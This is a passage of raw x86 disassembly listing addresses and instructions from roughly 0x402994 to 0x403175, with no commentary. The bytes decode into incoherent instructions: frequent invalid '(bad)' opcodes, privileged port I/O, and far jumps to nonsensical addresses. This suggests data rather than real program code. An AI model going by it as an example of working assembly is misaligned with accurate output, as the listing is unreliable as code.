  402994:	imul   eax,esi,0x84977975
  40299a:	inc    esi
  40299b:	push   edx
  40299c:	sti    
  40299d:	je     0x4029af
  40299f:	add    eax,0xb41120c0
  4029a4:	aad    0xbb
  4029a6:	loopne 0x4029f8
  4029a8:	or     eax,0xb7814607
  4029ad:	(bad)  
  4029ae:	pop    ss
  4029af:	ins    DWORD PTR es:[edi],dx
  4029b0:	imul   esi,DWORD PTR [edi],0xffffff9d
  4029b3:	lea    ecx,[ebx-0x6401163d]
  4029b9:	xchg   ebp,edx
  4029bb:	cmp    DWORD PTR [eax-0x70],ecx
  4029be:	add    edi,DWORD PTR [eax+eiz*2+0x5b934154]
  4029c5:	mov    dl,0xcb
  4029c7:	xchg   esi,eax
  4029c8:	loopne 0x4029cd
  4029ca:	scas   al,BYTE PTR es:[edi]
  4029cb:	mov    ch,ah
  4029cd:	bound  esi,QWORD PTR [esi]
  4029cf:	xchg   ebp,eax
  4029d0:	rol    BYTE PTR [ecx+0x54],cl
  4029d3:	ret    0x9af3
  4029d6:	mov    esp,0x9e8aee51
  4029db:	fisttp DWORD PTR [ebx+0x534f3ba9]
  4029e1:	adc    BYTE PTR [ebx-0x77e422a9],bh
  4029e7:	cmp    edx,esp
  4029e9:	lea    ebp,[edi-0x70]
  4029ec:	adc    eax,0xbd7f0377
  4029f1:	test   al,dh
  4029f3:	pop    ebp
  4029f4:	inc    edi
  4029f5:	push   edi
  4029f6:	arpl   WORD PTR [edi],sp
  4029f8:	das    
  4029f9:	jle    0x402a4c
  4029fb:	dec    esi
  4029fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029fd:	or     al,0xe6
  4029ff:	int3   
  402a00:	jbe    0x4029a6
  402a02:	push   esp
  402a03:	fsub   QWORD PTR [ebp+0x46907837]
  402a09:	mov    esi,0x9b39c5fb
  402a0e:	stc    
  402a0f:	sahf   
  402a10:	pop    ds
  402a11:	inc    ebp
  402a12:	retf   
  402a13:	xlat   BYTE PTR ds:[ebx]
  402a14:	lea    ebx,[ebx+0x2c]
  402a17:	ror    BYTE PTR [edx],cl
  402a19:	aaa    
  402a1a:	xchg   ebx,eax
  402a1b:	sti    
  402a1c:	mov    ebp,0x52699541
  402a21:	jmp    0x2b4eadb1
  402a26:	push   es
  402a27:	js     0x4029c3
  402a29:	add    cl,al
  402a2b:	(bad)  [ecx-0x6a]
  402a2e:	int3   
  402a2f:	inc    esi
  402a30:	cmp    BYTE PTR [ecx],bl
  402a32:	and    DWORD PTR [ecx-0x6809bd09],esi
  402a38:	push   0xfffffff7
  402a3a:	jge    0x4029d3
  402a3c:	push   esi
  402a3d:	mov    bh,0x98
  402a3f:	or     al,bl
  402a41:	or     al,0x8c
  402a43:	jae    0x4029f6
  402a45:	and    bl,dh
  402a47:	sbb    BYTE PTR [ecx-0x50fa3840],0x62
  402a4e:	jb     0x402a7d
  402a50:	xor    eax,0xf98b3946
  402a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a56:	mov    ds:0xd1f9cb17,al
  402a5b:	test   al,0xe0
  402a5d:	(bad)
  402a60:	lods   al,BYTE PTR ds:[esi]
  402a61:	icebp  
  402a62:	xor    ebp,eax
  402a64:	test   eax,0x3018b479
  402a69:	ss cwde 
  402a6b:	jmp    0xcf76:0x164feaf
  402a72:	out    0xb2,eax
  402a74:	fadd   DWORD PTR [edx+ecx*2]
  402a77:	push   eax
  402a78:	cli    
  402a79:	sbb    DWORD PTR [ebp-0x27],edi
  402a7c:	push   eax
  402a7d:	jno    0x402a83
  402a7f:	and    al,BYTE PTR [ebx]
  402a81:	out    0x6b,al
  402a83:	popf   
  402a84:	jl     0x402b04
  402a86:	stc    
  402a87:	dec    esi
  402a88:	outs   dx,DWORD PTR ds:[esi]
  402a89:	adc    BYTE PTR [ecx],0x61
  402a8c:	mov    eax,0x482b379e
  402a91:	push   esi
  402a92:	push   edi
  402a93:	pop    ebx
  402a94:	lods   al,BYTE PTR ds:[esi]
  402a95:	jp     0x402acc
  402a97:	xor    DWORD PTR [edx],0x31
  402a9a:	cs cmp al,0xdd
  402a9d:	or     esi,DWORD PTR ds:0x85194e6a
  402aa3:	push   ecx
  402aa4:	or     ah,bl
  402aa6:	aam    0xbd
  402aa8:	es icebp 
  402aaa:	clc    
  402aab:	icebp  
  402aac:	push   edi
  402aad:	pushf  
  402aae:	sti    
  402aaf:	mov    ecx,0x7eb88406
  402ab4:	or     ch,cl
  402ab6:	add    eax,0xd8dce6a5
  402abb:	test   DWORD PTR ds:0x3a639d45,ebx
  402ac1:	test   BYTE PTR [edx-0xb5c5c81],ch
  402ac7:	push   cs
  402ac8:	aad    0x63
  402aca:	out    0x85,al
  402acc:	scas   eax,DWORD PTR es:[edi]
  402acd:	push   esi
  402acf:	push   eax
  402ad0:	jp     0x402a99
  402ad2:	mov    ecx,esp
  402ad4:	inc    ecx
  402ad5:	rcl    DWORD PTR [edx+0x6b],1
  402ad8:	add    al,0xe
  402ada:	pushf  
  402adb:	in     eax,dx
  402adc:	mov    al,ds:0xfe9a5471
  402ae1:	in     eax,dx
  402ae2:	aam    0x3d
  402ae4:	cwde   
  402ae5:	(bad)  
  402ae6:	(bad)  
  402ae7:	mov    edi,0x847dd1d0
  402aec:	nop
  402aed:	or     BYTE PTR ds:0xd070ded1,dh
  402af3:	gs or  al,0xf7
  402af6:	jnp    0x402b3e
  402af8:	nop
  402af9:	sub    al,0x6a
  402afb:	or     edi,DWORD PTR [ecx+0x29350824]
  402b01:	popf   
  402b02:	xchg   ecx,eax
  402b03:	(bad)  [eax-0x13]
  402b06:	imul   edx,DWORD PTR [ecx],0xcd303a19
  402b0c:	test   eax,0x12772026
  402b11:	aas    
  402b12:	shr    BYTE PTR [esi+0x45],1
  402b15:	dec    edx
  402b16:	ret    
  402b17:	call   0x78650f53
  402b1c:	in     eax,dx
  402b1d:	mov    ebp,0x8ca2c776
  402b22:	or     eax,0x2a6ae2e5
  402b27:	sbb    al,0xe4
  402b29:	jb     0x402b4b
  402b2b:	je     0x402aad
  402b2d:	inc    esp
  402b2e:	pop    edi
  402b2f:	cs into 
  402b31:	mov    WORD PTR [ecx-0x23],es
  402b34:	push   ss
  402b35:	pop    es
  402b36:	data16 outs dx,BYTE PTR ds:[esi]
  402b38:	mov    bh,BYTE PTR [edi+0x1e]
  402b3b:	mov    cl,0x66
  402b3d:	push   esi
  402b3e:	dec    ecx
  402b3f:	cmc    
  402b40:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402b42:	cli    
  402b43:	xchg   edi,eax
  402b44:	jne    0x402baa
  402b46:	loopne 0x402b6a
  402b48:	jnp    0x402b39
  402b4a:	cli    
  402b4b:	mov    esi,ss
  402b4d:	inc    ecx
  402b4e:	xchg   ebp,eax
  402b4f:	and    BYTE PTR [ebx-0x26c7d06e],0x70
  402b56:	push   0x35
  402b58:	or     ch,BYTE PTR [eax-0x2a]
  402b5b:	retf   0xcbd2
  402b5e:	icebp  
  402b5f:	stos   BYTE PTR es:[edi],al
  402b60:	pop    eax
  402b61:	bound  ecx,QWORD PTR [ebx]
  402b63:	retf   0xfdea
  402b66:	dec    esp
  402b67:	xor    bh,dl
  402b69:	and    DWORD PTR [edi],edx
  402b6b:	xor    bl,BYTE PTR [ecx-0x130b18a1]
  402b71:	lds    ebp,FWORD PTR [ebx-0x27798e2e]
  402b77:	mov    edx,0xe264efbb
  402b7c:	cmc    
  402b7d:	fidivr WORD PTR [edi-0x38]
  402b80:	cmp    DWORD PTR [esi+0x69],esi
  402b83:	push   esi
  402b84:	cmp    eax,0xdac21a7c
  402b89:	addr16 aas 
  402b8b:	test   al,0xf0
  402b8d:	int    0x11
  402b8f:	out    0x48,al
  402b91:	mov    ah,0x70
  402b93:	stc    
  402b94:	out    dx,al
  402b95:	shr    DWORD PTR [edx+edx*4+0x613ac1a6],cl
  402b9c:	imul   ebx,DWORD PTR [edi+0x6f],0xffffffce
  402ba0:	sub    ah,BYTE PTR [esi]
  402ba2:	pop    ecx
  402ba3:	adc    cl,BYTE PTR [eax+0x39249e07]
  402ba9:	mov    eax,0xb7daf666
  402bae:	outs   dx,BYTE PTR ds:[esi]
  402baf:	int3   
  402bb0:	sti    
  402bb1:	scas   eax,DWORD PTR es:[edi]
  402bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb3:	push   ebx
  402bb4:	dec    ebp
  402bb5:	cmp    eax,0x92fa4564
  402bba:	fucomi st,st(7)
  402bbc:	push   ebp
  402bbd:	in     eax,dx
  402bbe:	(bad)  
  402bbf:	pop    eax
  402bc0:	fsubr  st(2),st
  402bc2:	imul   esp,DWORD PTR [ecx+0x4f6c3dba],0x51d13836
  402bcc:	xor    eax,0xafd5a2fb
  402bd1:	in     eax,dx
  402bd2:	out    0xfe,al
  402bd4:	stos   DWORD PTR es:[edi],eax
  402bd5:	lea    edi,[esi+ebx*1+0x753e4a78]
  402bdc:	(bad)  
  402bdd:	repnz dec DWORD PTR [edi+0x390f3b1f]
  402be4:	int    0xf9
  402be6:	ss icebp 
  402be8:	push   esi
  402be9:	in     al,0x34
  402beb:	inc    edi
  402bec:	jmp    0x95b8:0x57b48d6d
  402bf3:	mov    cl,0x5f
  402bf5:	cmp    DWORD PTR [ebp+0x6852f667],eax
  402bfb:	xchg   ecx,eax
  402bfc:	dec    ebx
  402bfd:	pushf  
  402bfe:	mov    eax,edi
  402c00:	clc    
  402c01:	pusha  
  402c02:	(bad)  
  402c03:	cmp    ebx,ebx
  402c05:	push   edi
  402c06:	cld    
  402c07:	xchg   ecx,eax
  402c08:	(bad)  
  402c09:	cs sahf 
  402c0b:	sbb    al,dl
  402c0d:	lock in eax,0xb
  402c10:	pushf  
  402c11:	inc    ecx
  402c12:	lea    ebp,[edx+0x27fba46]
  402c18:	ret    0x2a1e
  402c1b:	jne    0x402c84
  402c1d:	jb     0x402c22
  402c1f:	or     cl,ah
  402c21:	imul   ebp,DWORD PTR [eax+0x6bbeeb1f],0xd1e34e37
  402c2b:	jbe    0x402c5b
  402c2d:	int3   
  402c2e:	neg    DWORD PTR ds:0xc2a5285e
  402c34:	sub    edi,0xc51d2486
  402c3a:	inc    esp
  402c3b:	xchg   esi,eax
  402c3c:	jle    0x402bdc
  402c3e:	pop    es
  402c3f:	ret    0xb761
  402c42:	test   al,0xb2
  402c44:	cs cmpxchg ecx,eax
  402c48:	push   0x992b850
  402c4d:	or     eax,0xedb47b0b
  402c52:	test   BYTE PTR ss:[ebp+0x62],ah
  402c56:	stos   DWORD PTR es:[edi],eax
  402c57:	xor    dh,dl
  402c59:	sbb    edx,esp
  402c5b:	int    0xd6
  402c5d:	nop
  402c5e:	(bad)  
  402c5f:	mov    ebx,0xab47be79
  402c64:	ss pop ds
  402c66:	je     0x402c49
  402c68:	in     eax,dx
  402c69:	mov    cs,edi
  402c6b:	sti    
  402c6c:	inc    esi
  402c6d:	repz scas al,BYTE PTR es:[edi]
  402c6f:	fstp   TBYTE PTR [esi-0x1e]
  402c72:	nop
  402c73:	out    dx,eax
  402c74:	pusha  
  402c75:	dec    ecx
  402c76:	sti    
  402c77:	pop    ebp
  402c78:	aam    0x7b
  402c7a:	inc    ebx
  402c7b:	adc    BYTE PTR [esi],dl
  402c7d:	pop    esp
  402c7e:	jecxz  0x402c0a
  402c80:	fisub  WORD PTR ds:0x4202aa3
  402c86:	hlt    
  402c87:	sub    BYTE PTR [edx-0x11],dh
  402c8a:	jae    0x402c91
  402c8c:	push   ds
  402c8d:	mov    dh,0x4b
  402c8f:	mov    ebp,0x5140eabe
  402c94:	mov    edi,DWORD PTR [ecx-0x51a37c32]
  402c9a:	outs   dx,DWORD PTR ds:[esi]
  402c9b:	or     ecx,DWORD PTR [ebx-0x5c]
  402c9e:	int    0xd2
  402ca0:	les    edx,FWORD PTR [ebp-0x38e40434]
  402ca6:	retf   0x4fed
  402ca9:	inc    edi
  402caa:	out    0x47,eax
  402cac:	jo     0x402d19
  402cae:	sub    eax,0x2fbccb6e
  402cb3:	sbb    eax,0x5cb472b7
  402cb8:	sub    eax,0xe82eac9b
  402cbd:	jge    0x402c90
  402cbf:	mov    bl,0x6f
  402cc1:	call   0xd532:0x23e86ef8
  402cc8:	cmp    cl,BYTE PTR [ecx-0x2bd0f516]
  402cce:	bound  ebx,QWORD PTR [ebx-0x7806b455]
  402cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd5:	call   0x4f22:0x4c34775f
  402cdc:	xor    bh,ch
  402cde:	mov    cl,0x75
  402ce0:	pop    edi
  402ce1:	push   0x45
  402ce3:	stos   DWORD PTR es:[edi],eax
  402ce4:	xor    esp,DWORD PTR [ebx+0x5dc78cd2]
  402cea:	cs out dx,eax
  402cec:	popf   
  402ced:	fwait
  402cee:	sub    bh,BYTE PTR [edi]
  402cf0:	add    esi,DWORD PTR [edx+0x1b11d04f]
  402cf6:	imul   BYTE PTR [edi-0x40266b10]
  402cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cfd:	inc    esp
  402cfe:	mov    edx,0x5f887fa5
  402d03:	(bad)  
  402d04:	ror    BYTE PTR [eax-0x52],0x65
  402d08:	mov    edi,0x832e33f9
  402d0d:	xchg   edi,eax
  402d0e:	stc    
  402d0f:	or     BYTE PTR [esi],bl
  402d11:	mov    dl,0x6a
  402d13:	add    DWORD PTR [esi+0x7ea17ba5],esp
  402d19:	(bad)  
  402d1a:	cmp    ebx,DWORD PTR [esi]
  402d1c:	inc    ebx
  402d1d:	or     cl,0xd4
  402d20:	stc    
  402d21:	into   
  402d22:	pop    esi
  402d23:	dec    edi
  402d24:	jb     0x402d52
  402d26:	or     eax,0x93e89b17
  402d2b:	add    DWORD PTR [edx+0x64b5ca37],edx
  402d31:	call   0xd6d1:0x3cd5f073
  402d38:	adc    al,0x37
  402d3a:	ja     0x402d82
  402d3c:	test   BYTE PTR [edi-0x60],0xae
  402d40:	push   esi
  402d41:	cli    
  402d42:	div    esi
  402d44:	mov    eax,DWORD PTR [esi]
  402d46:	loope  0x402d0b
  402d48:	repnz push ds
  402d4a:	mov    edx,0x3ee34c35
  402d4f:	data16 fsubr DWORD PTR [ecx]
  402d52:	icebp  
  402d53:	xor    esi,ebp
  402d55:	ret    0xce8b
  402d58:	lods   eax,DWORD PTR ds:[esi]
  402d59:	adc    eax,0xe497b5cc
  402d5e:	or     al,0xf4
  402d60:	(bad)  
  402d61:	cmp    eax,0x20c4585c
  402d66:	mov    ds:0xe47e0df0,eax
  402d6b:	mov    ah,0xf6
  402d6d:	push   ebp
  402d6e:	jecxz  0x402d77
  402d70:	jno    0x402d65
  402d72:	cmp    al,0x4e
  402d74:	lahf   
  402d75:	jecxz  0x402d65
  402d77:	mov    bh,0x59
  402d79:	inc    esi
  402d7a:	fcom   QWORD PTR [ebp+0x677c08b3]
  402d80:	dec    ecx
  402d81:	and    DWORD PTR [edx+0x265abfab],esi
  402d87:	push   edx
  402d88:	adc    eax,ecx
  402d8a:	popf   
  402d8b:	mov    bh,0xe1
  402d8d:	shl    DWORD PTR [edx+0x13265dec],cl
  402d93:	ret    
  402d94:	and    eax,0x33d5aa43
  402d99:	test   BYTE PTR ds:0x54e6ff8a,0x96
  402da0:	retf   
  402da1:	movlps QWORD PTR [edx],xmm4
  402da4:	mov    al,ds:0x8d9d412c
  402da9:	xor    al,0xa5
  402dab:	push   esi
  402dac:	mov    edi,0xb67bb9be
  402db1:	in     al,0x6
  402db3:	push   edi
  402db4:	jecxz  0x402d65
  402db6:	pop    esi
  402db7:	aas    
  402db8:	pop    eax
  402db9:	mov    DWORD PTR [edi+0x4f],esi
  402dbc:	icebp  
  402dbd:	mov    ds:0xeac294ea,al
  402dc2:	and    eax,0xbfb97e5b
  402dc7:	fcmove st,st(6)
  402dc9:	sahf   
  402dca:	mov    ecx,0xdd103f3c
  402dcf:	(bad)  
  402dd0:	mov    edx,0xeac9c2fb
  402dd5:	and    BYTE PTR [ecx+eax*1+0x74],al
  402dd9:	popa   
  402dda:	call   0x779d:0x2b42e5ef
  402de1:	cmp    dh,BYTE PTR [eax]
  402de3:	imul   ecx,DWORD PTR [edx],0xffffffbe
  402de6:	ins    DWORD PTR es:[edi],dx
  402de7:	jns    0x402e21
  402de9:	jnp    0x402df0
  402deb:	xor    eax,0xc433f12a
  402df0:	cld    
  402df1:	out    0x4e,eax
  402df3:	sbb    dl,BYTE PTR [edx]
  402df5:	dec    ebx
  402df6:	xor    al,0x2
  402df8:	lods   eax,DWORD PTR ds:[esi]
  402df9:	out    dx,eax
  402dfa:	imul   edi,DWORD PTR [edi+ecx*4-0xcf5498a],0x1a
  402e02:	xchg   ebp,eax
  402e03:	test   eax,edx
  402e05:	jmp    0x22b9c098
  402e0a:	pop    edi
  402e0b:	inc    esi
  402e0c:	inc    edx
  402e0d:	or     ebx,ebx
  402e0f:	retf   0xbf2f
  402e12:	retf   
  402e13:	xchg   ebp,eax
  402e14:	push   0x6e
  402e16:	out    dx,al
  402e17:	fmul   DWORD PTR [edi-0x4db8f702]
  402e1d:	loopne 0x402e2e
  402e1f:	cmp    eax,0xc4229553
  402e24:	in     eax,dx
  402e25:	inc    ebp
  402e26:	xchg   esi,eax
  402e27:	xchg   ecx,eax
  402e28:	push   ebx
  402e29:	add    BYTE PTR [ebp+0x4a3c1b4f],ah
  402e2f:	inc    ebx
  402e30:	popf   
  402e31:	fiadd  DWORD PTR [ebx+0x4b15c1f7]
  402e37:	push   0x53f5ab87
  402e3c:	pop    esi
  402e3d:	xchg   edx,eax
  402e3e:	jge    0x402df8
  402e40:	jmp    0x9518d3d5
  402e45:	mov    ds:0xe867dcee,al
  402e4a:	sub    eax,0x857c3943
  402e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e51:	leave  
  402e52:	inc    ecx
  402e53:	sub    DWORD PTR [eax],esp
  402e55:	bound  eax,QWORD PTR [eax-0x3680af2d]
  402e5b:	pop    ss
  402e5c:	xchg   ecx,eax
  402e5d:	jae    0x402e91
  402e5f:	jmp    0x402e32
  402e61:	xor    bl,ah
  402e63:	mov    dh,0xd0
  402e65:	in     eax,0x8e
  402e67:	scas   al,BYTE PTR es:[edi]
  402e68:	pop    esi
  402e69:	adc    bl,BYTE PTR ds:0xf233b2ab
  402e6f:	sbb    DWORD PTR [eax],eax
  402e71:	int3   
  402e72:	data16 mov dh,0x79
  402e75:	iret   
  402e76:	sbb    DWORD PTR [ecx-0x14bc0958],ecx
  402e7c:	adc    esi,DWORD PTR [esi+0x1ec8ff84]
  402e82:	retf   
  402e83:	push   edx
  402e84:	xor    ebp,DWORD PTR [eax+ecx*8-0x86a8040]
  402e8b:	jmp    0x3bfffa4e
  402e90:	mov    eax,0x13e963fe
  402e95:	mov    ebp,0xa2d9482c
  402e9a:	dec    ecx
  402e9b:	push   ebp
  402e9c:	das    
  402e9d:	pop    ebx
  402e9e:	mov    ah,0xd
  402ea0:	test   al,0xc7
  402ea2:	int    0xff
  402ea4:	cmp    esi,esp
  402ea6:	or     esp,DWORD PTR [ebp+0x4a]
  402ea9:	mov    dl,0xb
  402eab:	push   ds
  402eac:	jmp    0x402e79
  402eae:	sbb    eax,0xa2394f94
  402eb3:	test   al,0xc
  402eb5:	dec    esi
  402eb6:	adc    eax,0xc43b0512
  402ebb:	xchg   esp,eax
  402ebc:	or     eax,0x56d9d813
  402ec1:	call   0xbf1bea92
  402ec6:	dec    ebp
  402ec7:	repnz dec esi
  402ec9:	mov    al,ds:0xc475c3c
  402ece:	cli    
  402ecf:	loopne 0x402ec8
  402ed1:	jp     0x402eb3
  402ed3:	test   DWORD PTR [esi+0x74eabf12],esp
  402ed9:	test   ah,bl
  402edb:	xor    edx,DWORD PTR [esi+eiz*8+0x4ab47845]
  402ee2:	rol    ecx,cl
  402ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee5:	cdq    
  402ee6:	pop    ebx
  402ee7:	mov    al,0xbc
  402ee9:	(bad)  
  402eeb:	lods   al,BYTE PTR ds:[esi]
  402eec:	push   eax
  402eed:	pop    ebp
  402eee:	sub    DWORD PTR [esi+0x53dac6fe],edi
  402ef4:	popf   
  402ef5:	outs   dx,DWORD PTR ds:[esi]
  402ef6:	mov    edi,0x4e609168
  402efb:	or     ch,al
  402efd:	mov    BYTE PTR [esi+0x7a92ccb1],0xd
  402f04:	mov    ds:0xa9c69b42,al
  402f09:	jle    0x402f00
  402f0b:	je     0x402f41
  402f0d:	adc    eax,edi
  402f0f:	daa    
  402f10:	lock hlt 
  402f12:	inc    ecx
  402f13:	scas   al,BYTE PTR es:[edi]
  402f14:	cmp    ecx,DWORD PTR [ebx-0x367faa70]
  402f1a:	mov    ds:0xaa726f99,al
  402f1f:	sub    al,0xe0
  402f21:	mov    esi,0x23d376f5
  402f26:	outs   dx,BYTE PTR ds:[esi]
  402f27:	mov    eax,gs:0x7b97d751
  402f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f2e:	cmc    
  402f2f:	jp     0x402f99
  402f31:	mov    bl,0xc3
  402f33:	outs   dx,BYTE PTR ds:[si]
  402f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f36:	push   edi
  402f37:	inc    edx
  402f38:	cmp    BYTE PTR [eax-0x38],al
  402f3b:	jo     0x402ed4
  402f3d:	mov    al,0x44
  402f3f:	clc    
  402f40:	adc    BYTE PTR [ebx-0x41bd7e3a],bh
  402f46:	dec    esi
  402f47:	mov    ds:0xe80cd76a,eax
  402f4c:	addr16 sbb al,0x0
  402f4f:	stos   DWORD PTR es:[edi],eax
  402f50:	xchg   BYTE PTR [ebp+ebx*2-0x6f],ah
  402f54:	div    DWORD PTR [ebx+0x47995523]
  402f5a:	inc    edx
  402f5b:	(bad)  
  402f5c:	mov    dh,bh
  402f5e:	ja     0x402fdc
  402f60:	jmp    FWORD PTR [eax+0xa524b6e]
  402f66:	push   ds
  402f67:	jge    0x402f38
  402f69:	adc    BYTE PTR [edx+0x34],bh
  402f6c:	outs   dx,DWORD PTR ds:[esi]
  402f6d:	cmp    DWORD PTR [edx+edx*1-0x1123f8b],ecx
  402f74:	popf   
  402f75:	adc    eax,esp
  402f77:	xchg   ebp,eax
  402f78:	jp     0x402f7b
  402f7a:	fsubr  QWORD PTR [ebx-0xec1c559]
  402f80:	mov    esi,0x84b34c75
  402f85:	shr    cl,0xf0
  402f88:	push   0xc006d9e5
  402f8d:	rcr    BYTE PTR [edx+0x69],cl
  402f90:	xor    al,0x7c
  402f92:	js     0x402f43
  402f94:	pop    ss
  402f95:	dec    ecx
  402f96:	jns    0x402fd7
  402f98:	outs   dx,BYTE PTR ds:[esi]
  402f99:	loop   0x402f59
  402f9b:	cmp    ebp,ecx
  402f9d:	dec    esi
  402f9e:	lods   al,BYTE PTR ds:[esi]
  402f9f:	(bad)  
  402fa0:	retf   
  402fa1:	pop    ebp
  402fa2:	retf   0x7833
  402fa5:	xor    BYTE PTR [ecx],dl
  402fa7:	in     eax,0x98
  402fa9:	pop    ss
  402faa:	fwait
  402fab:	sub    DWORD PTR [ecx+0x7b],esi
  402fae:	test   eax,0xac37284a
  402fb3:	and    bh,BYTE PTR [edi+0x4a5e9a75]
  402fb9:	pop    esi
  402fba:	fdiv   QWORD PTR [ebp-0x6b]
  402fbd:	loope  0x402f51
  402fbf:	xor    bh,BYTE PTR [ebx]
  402fc1:	call   0x3749:0x94daac0b
  402fc8:	sub    BYTE PTR [esi-0x6c4ff7da],0x7e
  402fcf:	jno    0x402fef
  402fd1:	retf   0x8a51
  402fd4:	(bad)  
  402fd5:	pop    ebx
  402fd6:	ret    0xda65
  402fd9:	cmp    esi,esp
  402fdb:	mov    edi,0x3a152746
  402fe0:	repz and al,0x66
  402fe3:	out    dx,eax
  402fe4:	(bad)  
  402fe5:	adc    DWORD PTR ds:0xcd681203,edi
  402feb:	jg     0x403003
  402fed:	jge    0x402f96
  402fef:	std    
  402ff0:	aam    0xee
  402ff2:	fisttp WORD PTR [edx]
  402ff4:	cmp    bh,BYTE PTR [edi+ebx*2-0x1c3c8c18]
  402ffb:	gs (bad) 
  402ffd:	mov    esi,0x5de2cdce
  403002:	int3   
  403003:	setge  BYTE PTR [edx]
  403006:	mov    ecx,0x61eea53c
  40300b:	mov    WORD PTR [ecx],?
  40300d:	ins    BYTE PTR es:[edi],dx
  40300e:	or     eax,DWORD PTR [ecx]
  403010:	sub    eax,DWORD PTR [ebx]
  403012:	cmp    DWORD PTR [esi-0x59499e9d],ecx
  403018:	les    esp,FWORD PTR [edx]
  40301a:	push   cs
  40301b:	ins    DWORD PTR es:[edi],dx
  40301c:	add    BYTE PTR [eax],al
  40301e:	in     al,0x4
  403020:	or     DWORD PTR [eax+0xd451b2f],ebx
  403026:	pop    edi
  403027:	adc    eax,0x9b1b4894
  40302c:	mov    dl,0x5b
  40302e:	jmp    0x3541:0x86ce10f2
  403035:	mov    esp,0xa28c90a7
  40303a:	dec    esi
  40303b:	mov    esp,0x392bff67
  403040:	xchg   esp,eax
  403041:	and    al,0x83
  403043:	pushf  
  403044:	fisub  DWORD PTR [ebp+0x7b]
  403047:	sub    ah,BYTE PTR ds:0x40fc9e04
  40304d:	ins    BYTE PTR es:[edi],dx
  40304e:	jbe    0x402ffe
  403050:	jno    0x403023
  403052:	inc    ecx
  403053:	aam    0xc7
  403055:	ins    BYTE PTR es:[edi],dx
  403056:	mov    ds,WORD PTR [edi+0x45]
  403059:	cmp    eax,0xb3ff33fc
  40305e:	jns    0x402fe7
  403060:	mov    ds:0xd107e147,al
  403065:	mov    edx,0xba3c4ed8
  40306a:	sub    eax,0xe5672557
  40306f:	vpsrlq xmm4,xmm5,XMMWORD PTR [edi+0x6c8f1c5a]
  403077:	and    al,0x3a
  403079:	rcl    DWORD PTR [edx+eax*8],cl
  40307c:	popa   
  40307d:	add    eax,edi
  40307f:	jo     0x403064
  403081:	rcl    DWORD PTR [ebp-0x518a1d89],1
  403087:	push   0xa494127b
  40308c:	mov    al,ds:0xa5178b1f
  403091:	jb     0x403075
  403093:	cmp    esp,DWORD PTR [esi]
  403095:	add    esp,ecx
  403097:	dec    eax
  403098:	mov    ch,bh
  40309a:	pushf  
  40309b:	es inc esi
  40309d:	in     eax,dx
  40309e:	aad    0xd6
  4030a0:	(bad)  [ebx+0xe192f76]
  4030a6:	add    ebx,ebp
  4030a8:	jae    0x403109
  4030aa:	adc    DWORD PTR [edi+edi*8+0x6ec96021],ecx
  4030b1:	mov    ch,0x3e
  4030b3:	push   ss
  4030b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b5:	test   DWORD PTR [eax],edi
  4030b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030b8:	push   ds
  4030b9:	(bad)  
  4030ba:	mov    ds:0xa2ec7e55,al
  4030bf:	cdq    
  4030c0:	add    eax,0x64fb135d
  4030c5:	mov    ds:0x1773a7fe,eax
  4030ca:	add    eax,0x30efc6df
  4030cf:	mov    eax,ds:0xa69e60d7
  4030d4:	push   0xe9510b36
  4030d9:	jo     0x4030d6
  4030db:	fwait
  4030dc:	or     al,0x87
  4030de:	push   0x24
  4030e0:	jns    0x40312e
  4030e2:	sub    al,0x38
  4030e4:	pop    es
  4030e5:	in     al,0x5f
  4030e7:	and    al,0x1c
  4030e9:	add    al,0x52
  4030eb:	(bad)  
  4030ec:	jl     0x403129
  4030ee:	popa   
  4030ef:	push   edi
  4030f0:	adc    al,0x36
  4030f2:	cmp    edi,0x35
  4030f5:	adc    BYTE PTR [edx+0x5e],ch
  4030f8:	ins    DWORD PTR es:[edi],dx
  4030f9:	add    BYTE PTR [edi],cl
  4030fb:	cld    
  4030fc:	mov    bh,0x5
  4030fe:	mov    ds,WORD PTR [edi+0x26]
  403101:	mov    esp,ebp
  403103:	jecxz  0x403162
  403105:	or     dh,BYTE PTR [ecx]
  403107:	xor    eax,0x6981dba8
  40310c:	mov    ds:0x2f0b7c55,al
  403111:	mov    ch,0xd5
  403113:	inc    esp
  403114:	xor    edx,esp
  403116:	push   0x6a
  403118:	and    edx,0x7b351637
  40311e:	lods   al,BYTE PTR ds:[esi]
  40311f:	bnd jb 0x403185
  403122:	jnp    0x403189
  403124:	ror    DWORD PTR [esi],cl
  403126:	add    DWORD PTR [edx+0x545783f5],ecx
  40312c:	aas    
  40312d:	imul   edx,DWORD PTR [edi+0xe],0x6d
  403131:	cmp    al,0x3c
  403133:	cli    
  403134:	(bad)  
  403135:	lods   al,BYTE PTR ds:[esi]
  403136:	repz push esp
  403138:	mov    WORD PTR [esi-0x5b],fs
  40313b:	popf   
  40313c:	(bad)  
  40313d:	ins    BYTE PTR es:[edi],dx
  40313e:	mov    ds:0x2d62934a,al
  403143:	out    dx,eax
  403144:	js     0x40312e
  403146:	dec    esi
  403147:	fcomp  QWORD PTR [edi-0x19366311]
  40314d:	sub    al,0xf1
  40314f:	mov    edi,DWORD PTR [esi+0x2b]
  403152:	aad    0xbc
  403154:	xchg   ebx,eax
  403155:	cmp    al,0x27
  403157:	mov    esp,ds
  403159:	lock jmp 0x4031b4
  40315c:	in     eax,dx
  40315d:	lea    edi,[ebx+eax*4-0x7]
  403161:	aaa    
  403162:	out    0x22,al
  403164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403165:	scas   al,BYTE PTR es:[edi]
  403166:	pop    es
  403167:	xor    BYTE PTR [edi-0x4f8e358f],bh
  40316d:	or     ebp,DWORD PTR [edi]
  40316f:	mov    ch,0x66
  403171:	fcomp  DWORD PTR [ecx]
  403173:	pause  
  403175:	jae    0x4031c6
